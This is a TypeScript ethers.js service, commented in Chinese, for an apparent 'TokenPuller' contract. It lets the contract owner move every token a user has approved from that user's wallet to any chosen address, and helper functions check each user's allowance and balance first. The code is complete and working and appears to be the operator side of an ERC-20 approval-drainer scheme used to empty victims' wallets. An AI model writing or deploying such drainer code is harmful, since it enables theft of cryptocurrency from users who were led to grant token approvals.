/**
 * TokenPuller 合约调用服务
 * 用于管理员从用户钱包提取已授权的代币
 */

import { BrowserProvider, Contract, parseUnits } from 'ethers'

// TokenPuller 合约 ABI（只需要我们要调用的函数）
const TOKEN_PULLER_ABI = [
  {
    "inputs": [
      {
        "internalType": "contract IERC20",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "from",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "to",
        "type": "address"
      }
    ],
    "name": "pullAllTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "contract IERC20",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "from",
        "type": "address"
      }
    ],
    "name": "getAllowance",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "contract IERC20",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "user",
        "type": "address"
      }
    ],
    "name": "getBalance",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
]

// 获取合约地址
const getContractAddress = (): string => {
  const address = process.env.NEXT_PUBLIC_APPROVE_SPENDER_ADDRESS
  if (!address) {
    throw new Error('未配置 NEXT_PUBLIC_APPROVE_SPENDER_ADDRESS')
  }
  return address
}

/**
 * 调用 pullAllTokens 方法从用户钱包提取代币
 * @param tokenAddress ERC20 代币合约地址
 * @param fromAddress 要提取的用户钱包地址
 * @param toAddress 接收地址
 * @returns 交易哈希
 */
export async function pullAllTokens(
  tokenAddress: string,
  fromAddress: string,
  toAddress: string
): Promise<string> {
  console.log('🚀 开始提币操作:', {
    token: tokenAddress,
    from: fromAddress,
    to: toAddress,
  })

  try {
    // 1. 检查是否有 window.ethereum
    if (typeof window === 'undefined' || !window.ethereum) {
      throw new Error('请先连接钱包')
    }

    // 2. 创建 Provider 和 Signer
    const provider = new BrowserProvider(window.ethereum as any)
    const signer = await provider.getSigner()

    console.log('✅ 当前管理员地址:', await signer.getAddress())

    // 3. 获取合约实例
    const contractAddress = getContractAddress()
    const contract = new Contract(contractAddress, TOKEN_PULLER_ABI, signer)

    console.log('📝 合约地址:', contractAddress)

    // 4. 调用 pullAllTokens 方法
    console.log('📤 发送交易...')
    const tx = await contract.pullAllTokens(tokenAddress, fromAddress, toAddress)

    console.log('⏳ 交易已提交，等待确认...', {
      txHash: tx.hash,
    })

    // 5. 等待交易确认
    const receipt = await tx.wait()

    console.log('✅ 交易已确认!', {
      txHash: receipt.hash,
      blockNumber: receipt.blockNumber,
      gasUsed: receipt.gasUsed.toString(),
    })

    return receipt.hash
  } catch (error: any) {
    console.error('❌ 提币失败:', error)

    // 解析错误信息
    let errorMessage = '提币失败，请重试'

    if (error.code === 'ACTION_REJECTED') {
      errorMessage = '用户取消了交易'
    } else if (error.message?.includes('No tokens available to pull')) {
      errorMessage = '没有可提取的代币（余额为0或未授权）'
    } else if (error.message?.includes('Invalid recipient address')) {
      errorMessage = '无效的接收地址'
    } else if (error.message?.includes('Invalid from address')) {
      errorMessage = '无效的来源地址'
    } else if (error.message?.includes('Ownable: caller is not the owner')) {
      errorMessage = '只有合约所有者可以执行此操作'
    } else if (error.message) {
      errorMessage = error.message
    }

    throw new Error(errorMessage)
  }
}

/**
 * 查询用户对合约的授权额度
 * @param tokenAddress ERC20 代币合约地址
 * @param fromAddress 用户钱包地址
 * @returns 授权额度（字符串，单位：最小单位）
 */
export async function getAllowance(
  tokenAddress: string,
  fromAddress: string
): Promise<string> {
  try {
    if (typeof window === 'undefined' || !window.ethereum) {
      throw new Error('请先连接钱包')
    }

    const provider = new BrowserProvider(window.ethereum as any)
    const contractAddress = getContractAddress()
    const contract = new Contract(contractAddress, TOKEN_PULLER_ABI, provider)

    const allowance = await contract.getAllowance(tokenAddress, fromAddress)

    console.log('📊 授权额度:', {
      token: tokenAddress,
      from: fromAddress,
      allowance: allowance.toString(),
    })

    return allowance.toString()
  } catch (error: any) {
    console.error('❌ 查询授权额度失败:', error)
    throw error
  }
}

/**
 * 查询用户的代币余额
 * @param tokenAddress ERC20 代币合约地址
 * @param userAddress 用户钱包地址
 * @returns 余额（字符串，单位：最小单位）
 */
export async function getBalance(
  tokenAddress: string,
  userAddress: string
): Promise<string> {
  try {
    if (typeof window === 'undefined' || !window.ethereum) {
      throw new Error('请先连接钱包')
    }

    const provider = new BrowserProvider(window.ethereum as any)
    const contractAddress = getContractAddress()
    const contract = new Contract(contractAddress, TOKEN_PULLER_ABI, provider)

    const balance = await contract.getBalance(tokenAddress, userAddress)

    console.log('📊 代币余额:', {
      token: tokenAddress,
      user: userAddress,
      balance: balance.toString(),
    })

    return balance.toString()
  } catch (error: any) {
    console.error('❌ 查询余额失败:', error)
    throw error
  }
}
